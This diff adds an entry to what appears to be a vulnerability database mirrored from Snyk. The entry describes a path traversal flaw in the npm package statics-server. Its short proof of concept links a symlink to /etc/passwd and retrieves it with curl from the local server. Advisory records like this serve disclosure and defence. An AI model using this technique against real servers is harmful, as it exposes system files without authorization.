@@ -151,3 +151,35 @@
   references:
   - https://hackerone.com/reports/355458
   source_url: https://snyk.io/vuln/npm:statics-server:20180714
+- id: snykio:npm:statics-server:472065
+  title: Path Traversal
+  description: |
+    [statics-server][1] is a allows you to run statics servers.
+
+    Affected versions of this package are vulnerable to Path Traversal. It
+    is possible to read arbitrary files from a server by creating a symbolic
+    link and linking it to a file outside of the server\'s public directory.
+
+    ### PoC by 0xche   {#poc-by-0xche}
+
+        ~/$ ln -s /etc/passwd passwdsym
+        ~/$ curl localhost:8080/passwdsym
+
+
+
+    [1]: https://www.npmjs.com/package/statics-server
+  affected_package: statics-server
+  vulnerable_versions:
+  - "*"
+  severity: medium
+  package_manager: npm
+  cwe:
+  - CWE-22
+  disclosed_date: 2019-10-07
+  created_date: 2019-10-08
+  last_modified_date: 2019-10-08
+  credit:
+  - 0xche
+  references:
+  - https://hackerone.com/reports/695416
+  source_url: https://snyk.io/vuln/SNYK-JS-STATICSSERVER-472065
